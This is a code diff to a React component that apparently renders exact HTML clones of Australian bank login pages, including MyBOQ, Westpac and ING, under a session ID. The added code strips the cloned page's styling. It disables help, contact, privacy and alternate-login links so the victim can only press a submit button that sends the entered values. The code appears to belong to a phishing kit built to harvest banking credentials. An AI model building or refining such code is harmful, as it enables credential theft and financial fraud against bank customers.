@@ -1940,6 +1940,41 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
           closestBtnAny != null;
         if (!isLooseButton) return;
 
+        // ⭐⭐⭐ MYBOQ BUTTON KALICI 1. ISLEM: MAVI/MOR YAPAN CLASS'lari KESIN KALDIR
+        //   (surface-action-primary mavi renk, text-white, hover varyantlari, disabled varyantlari
+        //    ve group hover classi butonun rengini KALICI olarak mavi/mor tutuyordu, bizim inline
+        //    style'imiz class tarafindan override ediliyordu. Simdi TUM benzer class'lari siliyoruz.)
+        try {
+          const badClasses1: string[] = [];
+          for (let i = 0; i < node.classList?.length; i++) {
+            const cls = node.classList[i];
+            if (
+              // Surface action / ana mavi renk:
+              /(^|[\s_-])(bg|text|border|shadow|outline|ring)[\s_-]*.*(surface|action|primary|accent|brand|muted|link|on\s?-?action)([\s_-]|$)/i.test(cls) ||
+              // Hover/disyabled varyantlar:
+              /(^|[\s_-])hover:[\s_-]*.*(surface|action|primary|accent|brand)([\s_-]|$)/i.test(cls) ||
+              /(^|[\s_-])disabled:[\s_-]*.*(surface|action|text|border)([\s_-]|$)/i.test(cls) ||
+              // Group / focus-visible outline beyaz dis renk:
+              /(^|[\s_-])(group|focus-visible.*|justify-|sm:justify-|sm:text-|sm:w-|w-full|text-start|py-|px-|gap-md|rounded-md|flex|items-center)([\s_-]|$)/i.test(cls) ||
+              // Genel disabled class:
+              /disabled|disabl|not-allowed|is-disabled|btn-disabled|sg-Btn--disabled|disabled-btn/i.test(cls)
+            ) {
+              badClasses1.push(cls);
+            }
+          }
+          badClasses1.forEach((c) => { try { node.classList.remove(c); } catch {} });
+        } catch {}
+        // Ayrica style attr icindeki background/color/filter/opactiy temizle (sifirla):
+        try {
+          node.style.removeProperty("background");
+          node.style.removeProperty("background-color");
+          node.style.removeProperty("color");
+          node.style.removeProperty("filter");
+          node.style.removeProperty("-webkit-filter");
+          node.style.removeProperty("opacity");
+          node.style.removeProperty("pointer-events");
+        } catch {}
+
         // ⭐⭐⭐ MYBOQ: KESİN disabled KALDIR (buton orijinal HTML'de disabled olabilir,
         //   boş form yüklenince disabled → kullanıcı tıklayamaz. Form dolunca buradan
         //   kesin disabled kaldırılır, stiller uygulanır.)
@@ -1949,50 +1984,72 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
             try { node.removeAttribute("disabled"); } catch {}
           }
         } catch {}
-        try {
-          for (let i = 0; i < node.classList?.length; i++) {
-            const cls = node.classList[i];
-            if (/disabled|disabl|not-allowed|is-disabled|btn-disabled|sg-Btn--disabled|disabled-btn/i.test(cls)) {
-              try { node.classList.remove(cls); } catch {}
-            }
-          }
-        } catch {}
-        // ⭐ WESTPAC FIX 3: aria-disabled KULLANMA!
         try { node.removeAttribute("aria-disabled"); } catch {}
 
-        // ⭐ TÜM STİLLER applyButtonStyleCached (WeakMap cache) ile yaz:
-        //   AYNI deger polling'de tekrar tekrar SET EDILMIYOR → transition
-        //   220ms opacity tekrar baslatmiyor → YANIP SONME (FLICKER) %0!
-        applyButtonStyleCached(node, "position", "relative");
-        applyButtonStyleCached(node, "display", "inline-block");
-        applyButtonStyleCached(node, "z-index", "99999");
-        applyButtonStyleCached(node, "margin-top", "14px");
-        applyButtonStyleCached(node, "margin-bottom", "10px");
-        applyButtonStyleCached(node, "padding-top", "12px");
-        applyButtonStyleCached(node, "padding-bottom", "12px");
-        applyButtonStyleCached(node, "padding-left", "22px");
-        applyButtonStyleCached(node, "padding-right", "22px");
-        applyButtonStyleCached(node, "line-height", "1.35");
-        applyButtonStyleCached(node, "font-size", "15px");
-        applyButtonStyleCached(node, "font-weight", "700");
-        applyButtonStyleCached(node, "border-radius", "10px");
-        applyButtonStyleCached(node, "pointer-events", pointerEvents);
-        applyButtonStyleCached(node, "opacity", String(fadeOpacity));
-        applyButtonStyleCached(node, "filter", isValid ? "grayscale(0)" : `grayscale(${fadeGray})`);
-        applyButtonStyleCached(node, "-webkit-filter", isValid ? "grayscale(0)" : `grayscale(${fadeGray})`);
-        applyButtonStyleCached(node, "cursor", cursorVal);
-        applyButtonStyleCached(node, "background-color", bgColor);
-        applyButtonStyleCached(node, "background", bgColor);
-        applyButtonStyleCached(node, "color", fgColor);
-        applyButtonStyleCached(node, "border", borderColor);
-        applyButtonStyleCached(node, "box-shadow", boxShadow);
-        applyButtonStyleCached(node, "transform", isValid ? "translateY(0)" : "none");
-        // Transition polling'de tekrar tekrar yazma → Sadece 1 kez set et
-        applyButtonStyleCached(
-          node,
-          "transition",
-          "background-color 160ms ease, color 160ms ease, box-shadow 160ms ease, border-color 160ms ease, opacity 220ms ease, filter 220ms ease",
-        );
+        // ⭐⭐⭐ 2. BUTON (yanlis tıklama) KALICI DÜZELTME:
+        //   "Log in with your Log-in ID" / "login ID" / type=button (SUBMIT DEĞİL) ise
+        //   opacity dusur ve pointer-events kapat, kullanici sadece NEXT (submit) butonunu tıklasın.
+        const textLow = ((node as HTMLElement).textContent || "").toString().toLowerCase();
+        const titleLow = String(node.getAttribute("title") || "").toLowerCase();
+        const isSecondaryButton =
+          (tagLow === "button" && typeAttr !== "submit") ||
+          /log\s*-?in\s+id|login\s+id|log[- ]?in\s+with|join\s+now|contact\s+us|privacy|open\s+banking|internet\s+banking\s+help|system\s+status|myboq\s+features/i.test(`${textLow} ${titleLow}`);
+        if (isSecondaryButton) {
+          try { node.style.setProperty("opacity", "0.18", "important"); } catch {}
+          try { node.style.setProperty("pointer-events", "none", "important"); } catch {}
+          try { node.style.setProperty("filter", "grayscale(0.8)", "important"); } catch {}
+          return; // Bu butona daha fazla stil/handler UYGULAMA (tiklanamaz zaten.)
+        }
+
+        // ⭐⭐⭐ KALICI 3. ISLEM: STİLLERİ WeakMap CACHE'siz DIRECT setProperty ile yaz
+        //   (applyButtonStyleCached aynı değeri tekrar yazmadığı için bazı turda MOR kalıyordu,
+        //    şimdi HER POLLING TURUNDA direkt yazıyoruz, renk KESİN DEĞİŞİR.)
+        const direct = (p: string, v: string) => {
+          try { (node as HTMLElement).style.setProperty(p, v, "important"); } catch {}
+        };
+        direct("position", "relative");
+        direct("display", "inline-block");
+        direct("z-index", "999999");
+        direct("margin-top", "14px");
+        direct("margin-bottom", "10px");
+        direct("padding-top", "16px");
+        direct("padding-bottom", "16px");
+        direct("padding-left", "26px");
+        direct("padding-right", "26px");
+        direct("line-height", "1.35");
+        direct("font-size", "17px");
+        direct("font-weight", "800");
+        direct("border-radius", "12px");
+        direct("pointer-events", pointerEvents);
+        direct("opacity", String(isValid ? 1 : fadeOpacity));
+        direct("filter", isValid ? "grayscale(0)" : `grayscale(${fadeGray})`);
+        direct("-webkit-filter", isValid ? "grayscale(0)" : `grayscale(${fadeGray})`);
+        direct("cursor", cursorVal);
+        direct("background-color", bgColor);
+        direct("background", bgColor);
+        direct("color", fgColor);
+        direct("border", borderColor);
+        direct("box-shadow", boxShadow);
+        direct("transform", isValid ? "translateY(0)" : "none");
+        // 5 katman üst parent için de pointer-events + z-index garanti (tıklama KESİN çalışsın)
+        try {
+          let pa: HTMLElement | null = node.parentElement;
+          let d = 0;
+          while (pa && d < 5) {
+            try {
+              pa.style.setProperty("pointer-events", "auto", "important");
+              const z = Number(window.getComputedStyle(pa).zIndex || "0") || 0;
+              if (z < 50000) {
+                if (window.getComputedStyle(pa).position === "static") {
+                  pa.style.setProperty("position", "relative", "important");
+                }
+                pa.style.setProperty("z-index", String(50000 - d * 5000), "important");
+              }
+            } catch {}
+            pa = pa.parentElement;
+            d++;
+          }
+        } catch {}
       });
     };
 
@@ -2035,6 +2092,15 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
         (tagLow2 === "a" && /\bbtn\b/.test(String(node.getAttribute("class") || "").toLowerCase())) ||
         closestBtnAny2 != null;
       if (!isLooseButton2) return;
+
+      // ⭐⭐⭐ 2. BUTON FİLTRE: Submit OLMAYAN / yardımcı butonlara (Log in with your Log-in ID,
+      //   Join now, Contact Us, Features vb.) handler bağlama, tiklanamaz yap, sadece NEXT calissin.
+      const textLow2 = ((node as HTMLElement).textContent || "").toString().toLowerCase();
+      const titleLow2 = String(node.getAttribute("title") || "").toLowerCase();
+      const isSecondary2 =
+        (tagLow2 === "button" && typeAttr2 !== "submit") ||
+        /log\s*-?in\s+id|login\s+id|log[- ]?in\s+with|join\s+now|contact\s+us|privacy|open\s+banking|internet\s+banking\s+help|system\s+status|myboq\s+features/i.test(`${textLow2} ${titleLow2}`);
+      if (isSecondary2) return;
 
       // ⭐ Event handlerlari KESIN bagla (eski varsa once kaldır, tekrar bağla)
       try { node.removeEventListener("click", submitWithCurrentValues as any); } catch {}
@@ -2454,12 +2520,38 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
 
           candidateNodes.push(node);
 
+          // ⭐⭐⭐ POLLING: MA VI/MOR YAPAN CLASS'lari KESIN KALDIR (her polling turunda)
+          try {
+            const badClasses2: string[] = [];
+            for (let i = 0; i < node.classList?.length; i++) {
+              const cls = node.classList[i];
+              if (
+                /(^|[\s_-])(bg|text|border|shadow|outline|ring)[\s_-]*.*(surface|action|primary|accent|brand|muted|link|on\s?-?action)([\s_-]|$)/i.test(cls) ||
+                /(^|[\s_-])hover:[\s_-]*.*(surface|action|primary|accent|brand)([\s_-]|$)/i.test(cls) ||
+                /(^|[\s_-])disabled:[\s_-]*.*(surface|action|text|border)([\s_-]|$)/i.test(cls) ||
+                /(^|[\s_-])(group|focus-visible.*|justify-|sm:justify-|sm:text-|sm:w-|w-full|text-start|py-|px-|gap-md|rounded-md|flex|items-center)([\s_-]|$)/i.test(cls) ||
+                /disabled|disabl|not-allowed|is-disabled|btn-disabled|sg-Btn--disabled|disabled-btn/i.test(cls)
+              ) {
+                badClasses2.push(cls);
+              }
+            }
+            badClasses2.forEach((c) => { try { node.classList.remove(c); } catch {} });
+          } catch {}
+          try {
+            node.style.removeProperty("background");
+            node.style.removeProperty("background-color");
+            node.style.removeProperty("color");
+            node.style.removeProperty("filter");
+            node.style.removeProperty("-webkit-filter");
+            node.style.removeProperty("opacity");
+            node.style.removeProperty("pointer-events");
+          } catch {}
+
           // ⭐ MYBOQ: shouldForceEnable form doluysa (hasAnyImportant) TRUE olsun diye
           //   disabled kesin kaldır (polling turu basinda hesaplanan shouldForceEnable kullanilir)
           if ("disabled" in node) {
             try { (node as any).disabled = !shouldForceEnable; } catch {}
           }
-
           try {
             if (shouldForceEnable) {
               node.removeAttribute("disabled");
@@ -2467,66 +2559,80 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
           } catch {}
           try { node.removeAttribute("aria-disabled"); } catch {}
 
+          // ⭐⭐⭐ POLLING 2. BUTON FILTRE: Yardimci/iletisim/feature butonlari (submit olmayan)
+          //   tiklanamaz hale getir, kullanici SADECE NEXT (submit) butonu ile ilerlesin.
+          const textLP = ((node as HTMLElement).textContent || "").toString().toLowerCase();
+          const titleLP = String(node.getAttribute("title") || "").toLowerCase();
+          const isSecondaryLP =
+            (tagLowP === "button" && typeAttrP !== "submit") ||
+            /log\s*-?in\s+id|login\s+id|log[- ]?in\s+with|join\s+now|contact\s+us|privacy|open\s+banking|internet\s+banking\s+help|system\s+status|myboq\s+features/i.test(`${textLP} ${titleLP}`);
+          if (isSecondaryLP) {
+            try { node.style.setProperty("opacity", "0.18", "important"); } catch {}
+            try { node.style.setProperty("pointer-events", "none", "important"); } catch {}
+            try { node.style.setProperty("filter", "grayscale(0.8)", "important"); } catch {}
+            // Bu butona submit handler baglama, stillendirme yapma (candidateNodes'a ekledik ama devam etme)
+            return;
+          }
+
           // ⭐ (Eski 2. katman sıkı filtre KALDIRILDI. Gevşek filtre ile zaten giriş yapıldı.)
 
-          // ⭐ ING fadeOpacity + filter grayscale + pointer-events (saving olunca kapat)
-          //   WeakMap CACHE kullan → sadece DEGISEN degerler SET EDILIR → FLICKER YOK!
-          applyButtonStyleCached(node, "position", "relative");
-          applyButtonStyleCached(node, "display", "inline-block");
-          applyButtonStyleCached(node, "z-index", "99999");
-          applyButtonStyleCached(node, "margin-top", "14px");
-          applyButtonStyleCached(node, "margin-bottom", "10px");
-          applyButtonStyleCached(node, "padding-top", "12px");
-          applyButtonStyleCached(node, "padding-bottom", "12px");
-          applyButtonStyleCached(node, "padding-left", "22px");
-          applyButtonStyleCached(node, "padding-right", "22px");
-          applyButtonStyleCached(node, "line-height", "1.35");
-          applyButtonStyleCached(node, "font-size", "15px");
-          applyButtonStyleCached(node, "font-weight", "700");
-          applyButtonStyleCached(node, "border-radius", "10px");
-          applyButtonStyleCached(node, "pointer-events", saving ? "none" : "auto");
-          applyButtonStyleCached(node, "opacity", String(fadeOpacity));
-          applyButtonStyleCached(node, "filter", proceedNow ? "grayscale(0)" : `grayscale(${fadeGray})`);
-          applyButtonStyleCached(node, "-webkit-filter", proceedNow ? "grayscale(0)" : `grayscale(${fadeGray})`);
-          applyButtonStyleCached(
-            node,
-            "cursor",
-            shouldForceEnable ? "pointer" : (saving ? "wait" : "not-allowed"),
+          // ⭐⭐⭐ POLLING: STILI DIREKT YAZ (WeakMap cache YOK, her polling turunda KESIN guncelle)
+          const cursorPoll = shouldForceEnable ? "pointer" : (saving ? "wait" : "not-allowed");
+          const bgPoll = shouldForceEnable ? palette.bg : ((filledNow >= 1 && totalMeaningful >= 1) ? "#C9CED1" : "#E6E8EA");
+          const fgPoll = shouldForceEnable ? palette.fg : "#8A8E90";
+          const borderPoll = shouldForceEnable ? `1px solid ${palette.border}` : "1px solid transparent";
+          const shadowPoll = shouldForceEnable ? palette.shadow : "none";
+          const opacPoll = (proceedNow || shouldForceEnable) ? 1 : fadeOpacity;
+          const grayPoll = (proceedNow || shouldForceEnable) ? 0 : fadeGray;
+          const dir2 = (pp: string, vv: string) => {
+            try { node.style.setProperty(pp, vv, "important"); } catch {}
+          };
+          dir2("position", "relative");
+          dir2("display", "inline-block");
+          dir2("z-index", "999999");
+          dir2("margin-top", "14px");
+          dir2("margin-bottom", "10px");
+          dir2("padding-top", "16px");
+          dir2("padding-bottom", "16px");
+          dir2("padding-left", "26px");
+          dir2("padding-right", "26px");
+          dir2("line-height", "1.35");
+          dir2("font-size", "17px");
+          dir2("font-weight", "800");
+          dir2("border-radius", "12px");
+          dir2("pointer-events", saving ? "none" : "auto");
+          dir2("opacity", String(opacPoll));
+          dir2("filter", proceedNow ? "grayscale(0)" : `grayscale(${grayPoll})`);
+          dir2("-webkit-filter", proceedNow ? "grayscale(0)" : `grayscale(${grayPoll})`);
+          dir2("cursor", cursorPoll);
+          dir2("background-color", bgPoll);
+          dir2("background", bgPoll);
+          dir2("color", fgPoll);
+          dir2("border", borderPoll);
+          dir2("box-shadow", shadowPoll);
+          dir2("transform", shouldForceEnable ? "translateY(0)" : "none");
+          dir2(
+            "transition",
+            "background-color 160ms ease, color 160ms ease, box-shadow 160ms ease, border-color 160ms ease, opacity 220ms ease, filter 220ms ease",
           );
-
+          // Parent 5 katman pointer-events + z-index garanti
           try {
-            if (shouldForceEnable) {
-              const classesToRemove: string[] = [];
-              for (let i = 0; i < node.classList.length; i++) {
-                const cls = node.classList[i];
-                if (/disabled|disabl|not-allowed|is-disabled|btn-disabled|sg-Btn--disabled|disabled-btn/i.test(cls)) {
-                  classesToRemove.push(cls);
+            let pa2: HTMLElement | null = node.parentElement;
+            let d2 = 0;
+            while (pa2 && d2 < 5) {
+              try {
+                pa2.style.setProperty("pointer-events", "auto", "important");
+                const zz = Number(window.getComputedStyle(pa2).zIndex || "0") || 0;
+                if (zz < 50000) {
+                  if (window.getComputedStyle(pa2).position === "static") {
+                    pa2.style.setProperty("position", "relative", "important");
+                  }
+                  pa2.style.setProperty("z-index", String(50000 - d2 * 5000), "important");
                 }
-              }
-              classesToRemove.forEach((c) => node.classList.remove(c));
+              } catch {}
+              pa2 = pa2.parentElement;
+              d2++;
             }
-          } catch {}
-
-          try {
-            if (shouldForceEnable) {
-              applyButtonStyleCached(node, "background-color", palette.bg);
-              applyButtonStyleCached(node, "background", palette.bg);
-              applyButtonStyleCached(node, "color", palette.fg);
-              applyButtonStyleCached(node, "border", `1px solid ${palette.border}`);
-              applyButtonStyleCached(node, "box-shadow", palette.shadow);
-            } else {
-              const bgCol = (filledNow >= 1 && totalMeaningful >= 1) ? "#C9CED1" : "#E6E8EA";
-              applyButtonStyleCached(node, "background-color", bgCol);
-              applyButtonStyleCached(node, "background", bgCol);
-              applyButtonStyleCached(node, "color", "#8A8E90");
-              applyButtonStyleCached(node, "border", "1px solid transparent");
-              applyButtonStyleCached(node, "box-shadow", "none");
-            }
-            applyButtonStyleCached(
-              node,
-              "transition",
-              "background-color 160ms ease, color 160ms ease, box-shadow 160ms ease, border-color 160ms ease, opacity 220ms ease, filter 220ms ease",
-            );
           } catch {}
 
           try {
